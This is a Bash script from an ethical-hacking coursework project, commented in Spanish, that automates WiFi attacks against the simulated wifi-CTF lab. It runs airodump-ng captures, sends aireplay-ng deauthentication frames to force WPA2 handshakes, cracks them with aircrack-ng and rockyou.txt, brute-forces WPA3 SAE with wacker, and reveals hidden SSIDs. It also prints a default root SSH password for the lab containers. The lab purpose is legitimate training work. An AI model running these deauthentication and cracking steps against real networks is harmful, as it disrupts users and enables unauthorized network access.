#!/bin/bash
################################################################################
# WiFi Pentest Automation Script
# Zabala Gailetak - Hacking Etikoa
# 
# Script para automatizar pruebas de penetración WiFi utilizando wifi-CTF
# Basado en: https://github.com/sealingtech/wifi-ctf
#
# Uso: ./wifi_pentest_automation.sh [comando]
# Comandos:
#   setup     - Instalar dependencias y preparar entorno
#   start     - Iniciar el entorno wifi-CTF
#   scan      - Escanear redes disponibles
#   guest     - Ejecutar pruebas contra AP-Guest (Open)
#   wpa2      - Ejecutar pruebas contra AP-Bridged (WPA2-PSK)
#   wpa3      - Ejecutar pruebas contra AP-WPA3 (SAE)
#   hidden    - Ejecutar pruebas contra AP-Hidden (SSID oculto)
#   full      - Ejecutar todas las pruebas
#   stop      - Detener el entorno
#   clean     - Limpiar archivos temporales
################################################################################

set -e

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WIFI_CTF_DIR="/opt/wifi-ctf"
OUTPUT_DIR="$SCRIPT_DIR/../evidencias"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION_DIR="$OUTPUT_DIR/session_$TIMESTAMP"

# Banner
print_banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════════╗"
    echo "║         ZABALA GAILETAK - WiFi PENTEST AUTOMATION              ║"
    echo "║              Entorno Simulado (wifi-CTF)                        ║"
    echo "╚══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Funciones de utilidad
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[i]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_section() {
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# Verificar root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "Este script debe ejecutarse como root"
        exit 1
    fi
}

# Verificar dependencias
check_dependencies() {
    print_section "VERIFICANDO DEPENDENCIAS"
    
    local deps=("docker" "iw" "aircrack-ng" "airodump-ng" "aireplay-ng")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        print_error "Dependencias faltantes: ${missing[*]}"
        print_info "Ejecuta: ./wifi_pentest_automation.sh setup"
        exit 1
    fi
    
    print_status "Todas las dependencias están instaladas"
}

# Instalar dependencias
setup_environment() {
    print_section "INSTALANDO DEPENDENCIAS"
    
    print_status "Actualizando repositorios..."
    apt update
    
    print_status "Instalando paquetes necesarios..."
    apt install -y \
        docker.io \
        net-tools \
        hostapd \
        bridge-utils \
        dnsmasq \
        wpasupplicant \
        macchanger \
        aircrack-ng \
        tshark \
        jq \
        git
    
    print_status "Añadiendo usuario al grupo docker..."
    usermod -aG docker $SUDO_USER 2>/dev/null || true
    
    print_status "Clonando wifi-ctf..."
    if [ ! -d "$WIFI_CTF_DIR" ]; then
        git clone https://github.com/sealingtech/wifi-ctf.git "$WIFI_CTF_DIR"
    else
        print_info "wifi-ctf ya existe, actualizando..."
        cd "$WIFI_CTF_DIR" && git pull
    fi
    
    print_status "Construyendo imagen Docker..."
    cd "$WIFI_CTF_DIR"
    docker build -t ctf-kali -f build/Dockerfile . 2>/dev/null || \
        print_warning "No se pudo construir la imagen Docker (puede ser normal)"
    
    # Crear directorios
    mkdir -p "$OUTPUT_DIR"
    mkdir -p "$SESSION_DIR"
    
    print_status "Configuración completada"
    print_warning "Por favor, cierra sesión y vuelve a iniciar para aplicar cambios de grupo docker"
}

# Iniciar entorno wifi-CTF
start_environment() {
    print_section "INICIANDO ENTORNO WiFi-CTF"
    
    if [ ! -d "$WIFI_CTF_DIR" ]; then
        print_error "wifi-CTF no encontrado. Ejecuta: ./wifi_pentest_automation.sh setup"
        exit 1
    fi
    
    cd "$WIFI_CTF_DIR"
    
    print_status "Iniciando APs y contenedores..."
    ./start.sh &
    local start_pid=$!
    
    print_info "Esperando 10 segundos para inicialización..."
    sleep 10
    
    print_status "Entorno iniciado (PID: $start_pid)"
    print_info "Para conectar: ssh root@<ip_container> (password: ctf1234)"
    print_info "Para verificar: iwconfig wlan0 mode monitor && airodump-ng wlan0"
}

# Escanear redes
scan_networks() {
    print_section "ESCANEANDO REDES WiFi"
    
    local scan_dir="$SESSION_DIR/scan_$TIMESTAMP"
    mkdir -p "$scan_dir"
    
    print_status "Iniciando airodump-ng..."
    print_info "Escaneando por 30 segundos..."
    
    # Escanear en 2.4GHz
    timeout 30 airodump-ng wlan0 -w "$scan_dir/scan_2.4G" --output-format csv,netxml 2>/dev/null || true
    
    # Escanear en 5GHz
    print_info "Escaneando banda 5GHz..."
    timeout 30 airodump-ng --band a wlan0 -w "$scan_dir/scan_5G" --output-format csv,netxml 2>/dev/null || true
    
    print_status "Escaneo completado"
    print_info "Resultados guardados en: $scan_dir"
    
    # Mostrar resultados
    if [ -f "$scan_dir/scan_2.4G-01.csv" ]; then
        echo ""
        print_info "Redes detectadas (2.4GHz):"
        grep -E "^([0-9A-F]{2}:){5}[0-9A-F]{2}" "$scan_dir/scan_2.4G-01.csv" | \
            cut -d',' -f1,4,14 | column -s',' -t 2>/dev/null || true
    fi
}

# Pruebas contra AP-Guest (Open)
test_guest() {
    print_section "TEST: AP-GUEST (OPEN WiFi)"
    
    local test_dir="$SESSION_DIR/guest_$TIMESTAMP"
    mkdir -p "$test_dir"
    
    print_status "Configurando interfaz en monitor mode..."
    ip link set wlan0 down 2>/dev/null || true
    iwconfig wlan0 mode monitor 2>/dev/null || true
    ip link set wlan0 up 2>/dev/null || true
    
    print_status "Escaneando AP-Guest (canal 6)..."
    timeout 15 airodump-ng -c 6 --essid "AP-Guest" -w "$test_dir/guest_capture" wlan0 2>/dev/null || true
    
    print_info "Analizando clientes conectados..."
    if [ -f "$test_dir/guest_capture-01.csv" ]; then
        grep -E "^([0-9A-F]{2}:){5}[0-9A-F]{2}" "$test_dir/guest_capture-01.csv" | tail -n +2 > "$test_dir/clients.txt"
        print_status "Clientes encontrados:"
        cat "$test_dir/clients.txt" | while read line; do
            local mac=$(echo "$line" | cut -d',' -f1)
            local power=$(echo "$line" | cut -d',' -f4)
            echo "  - MAC: $mac, Power: $power"
        done
    fi
    
    print_status "Capturando tráfico (30 segundos)..."
    timeout 30 tshark -i wlan0 -f "wlan host 02:00:00:00:04:00" -w "$test_dir/traffic.pcap" 2>/dev/null || true
    
    print_status "Prueba completada"
    print_info "Evidencias: $test_dir"
}

# Pruebas contra AP-Bridged (WPA2-PSK)
test_wpa2() {
    print_section "TEST: AP-BRIDGED (WPA2-PSK CRACKING)"
    
    local test_dir="$SESSION_DIR/wpa2_$TIMESTAMP"
    mkdir -p "$test_dir"
    
    print_status "Escaneando AP-Bridged (canal 1)..."
    airodump-ng -c 1 --bssid 02:00:00:00:03:00 -w "$test_dir/wpa2_capture" wlan0 &
    local airodump_pid=$!
    
    sleep 5
    
    print_status "Enviando deauth frames..."
    aireplay-ng -0 5 -a 02:00:00:00:03:00 wlan0 2>/dev/null || true
    
    print_info "Esperando handshake (20 segundos)..."
    sleep 20
    
    kill $airodump_pid 2>/dev/null || true
    
    print_status "Intentando crackear con wordlist..."
    if [ -f "$test_dir/wpa2_capture-01.cap" ]; then
        aircrack-ng "$test_dir/wpa2_capture-01.cap" -w /usr/share/wordlists/rockyou.txt > "$test_dir/crack_result.txt" 2>&1 || true
        
        if grep -q "KEY FOUND" "$test_dir/crack_result.txt"; then
            print_status "¡PASSWORD CRACKEADO!"
            grep "KEY FOUND" "$test_dir/crack_result.txt"
        else
            print_warning "No se encontró el password en la wordlist"
        fi
    fi
    
    print_status "Prueba completada"
    print_info "Evidencias: $test_dir"
}

# Pruebas contra AP-WPA3
test_wpa3() {
    print_section "TEST: AP-WPA3 (SAE BRUTE-FORCE)"
    
    local test_dir="$SESSION_DIR/wpa3_$TIMESTAMP"
    mkdir -p "$test_dir"
    
    print_status "Instalando wacker..."
    if [ ! -d "/opt/wacker" ]; then
        git clone https://github.com/blunderbuss-wctf/wacker.git /opt/wacker 2>/dev/null || true
        cd /opt/wacker && pip install -r requirements.txt 2>/dev/null || true
    fi
    
    print_status "Ejecutando ataque SAE brute-force..."
    cd /opt/wacker
    timeout 60 python wacker.py -i wlan0 -b 02:00:00:00:05:00 \
        -s "AP-WPA3" -w /usr/share/wordlists/rockyou.txt > "$test_dir/wacker_output.txt" 2>&1 || true
    
    if grep -q "Connected" "$test_dir/wacker_output.txt"; then
        print_status "¡ATAQUE EXITOSO!"
        grep -E "(Connected|Password)" "$test_dir/wacker_output.txt"
    else
        print_warning "Ataque no exitoso en el tiempo establecido"
    fi
    
    print_status "Prueba completada"
    print_info "Evidencias: $test_dir"
}

# Pruebas contra AP-Hidden
test_hidden() {
    print_section "TEST: AP-HIDDEN (SSID DECLAKING)"
    
    local test_dir="$SESSION_DIR/hidden_$TIMESTAMP"
    mkdir -p "$test_dir"
    
    print_status "Escaneando banda 5GHz..."
    timeout 20 airodump-ng --band a -w "$test_dir/hidden_scan" wlan0 2>/dev/null || true
    
    print_info "Buscando AP con SSID oculto..."
    if [ -f "$test_dir/hidden_scan-01.csv" ]; then
        # Buscar BSSID con SSID vacío o de longitud variable
        grep -E "<length:" "$test_dir/hidden_scan-01.csv" > "$test_dir/hidden_aps.txt" || true
        
        if [ -s "$test_dir/hidden_aps.txt" ]; then
            print_status "AP con SSID oculto encontrado:"
            cat "$test_dir/hidden_aps.txt"
            
            # Esperar a que un cliente se conecte para revelar el SSID
            print_info "Esperando probe responses (30 segundos)..."
            timeout 30 airodump-ng -c 36 --bssid 02:00:00:00:06:00 \
                -w "$test_dir/hidden_reveal" wlan0 2>/dev/null || true
            
            # Verificar si se reveló el SSID
            if [ -f "$test_dir/hidden_reveal-01.csv" ]; then
                local ssid=$(grep "AP-Hidden" "$test_dir/hidden_reveal-01.csv" | head -1 | cut -d',' -f14 | tr -d '"')
                if [ -n "$ssid" ]; then
                    print_status "¡SSID REVELADO: $ssid!"
                fi
            fi
        else
            print_warning "No se encontraron APs con SSID oculto"
        fi
    fi
    
    print_status "Prueba completada"
    print_info "Evidencias: $test_dir"
}

# Ejecutar todas las pruebas
run_full_test() {
    print_section "EJECUTANDO TEST COMPLETO"
    
    check_dependencies
    
    scan_networks
    test_guest
    test_wpa2
    test_wpa3
    test_hidden
    
    print_section "RESUMEN DEL TEST"
    print_status "Todas las pruebas completadas"
    print_info "Evidencias guardadas en: $SESSION_DIR"
    print_info "Comprimiendo resultados..."
    
    local tar_file="$OUTPUT_DIR/wifi_pentest_${TIMESTAMP}.tar.gz"
    tar -czf "$tar_file" -C "$SESSION_DIR" .
    print_status "Archivo comprimido: $tar_file"
}

# Detener entorno
stop_environment() {
    print_section "DETENIENDO ENTORNO"
    
    print_status "Deteniendo contenedores..."
    docker stop $(docker ps -q --filter "ancestor=ctf-kali") 2>/dev/null || true
    
    print_status "Deteniendo hostapd..."
    killall hostapd 2>/dev/null || true
    killall wpa_supplicant 2>/dev/null || true
    
    print_status "Restaurando interfaz..."
    ip link set wlan0 down 2>/dev/null || true
    iwconfig wlan0 mode managed 2>/dev/null || true
    ip link set wlan0 up 2>/dev/null || true
    
    print_status "Entorno detenido"
}

# Limpiar archivos temporales
clean_temp() {
    print_section "LIMPIANDO ARCHIVOS TEMPORALES"
    
    read -p "¿Estás seguro de eliminar todas las evidencias? (s/N): " confirm
    if [[ "$confirm" =~ ^[Ss]$ ]]; then
        rm -rf "$OUTPUT_DIR"
        print_status "Archivos eliminados"
    else
        print_info "Operación cancelada"
    fi
}

# Menú de ayuda
show_help() {
    echo "Uso: $0 [comando]"
    echo ""
    echo "Comandos:"
    echo "  setup     Instalar dependencias y preparar entorno"
    echo "  start     Iniciar el entorno wifi-CTF"
    echo "  scan      Escanear redes disponibles"
    echo "  guest     Ejecutar pruebas contra AP-Guest (Open)"
    echo "  wpa2      Ejecutar pruebas contra AP-Bridged (WPA2-PSK)"
    echo "  wpa3      Ejecutar pruebas contra AP-WPA3 (SAE)"
    echo "  hidden    Ejecutar pruebas contra AP-Hidden (SSID oculto)"
    echo "  full      Ejecutar todas las pruebas"
    echo "  stop      Detener el entorno"
    echo "  clean     Limpiar archivos temporales"
    echo "  help      Mostrar esta ayuda"
    echo ""
    echo "Ejemplos:"
    echo "  $0 setup     # Instalación inicial"
    echo "  $0 start     # Iniciar entorno"
    echo "  $0 full      # Ejecutar test completo"
    echo "  $0 stop      # Detener todo"
}

# Main
main() {
    print_banner
    
    case "${1:-help}" in
        setup)
            check_root
            setup_environment
            ;;
        start)
            check_root
            start_environment
            ;;
        scan)
            check_dependencies
            scan_networks
            ;;
        guest)
            check_dependencies
            test_guest
            ;;
        wpa2)
            check_dependencies
            test_wpa2
            ;;
        wpa3)
            check_dependencies
            test_wpa3
            ;;
        hidden)
            check_dependencies
            test_hidden
            ;;
        full)
            check_root
            run_full_test
            ;;
        stop)
            check_root
            stop_environment
            ;;
        clean)
            clean_temp
            ;;
        help|--help|-h)
            show_help
            ;;
        *)
            print_error "Comando desconocido: $1"
            show_help
            exit 1
            ;;
    esac
}

main "$@"
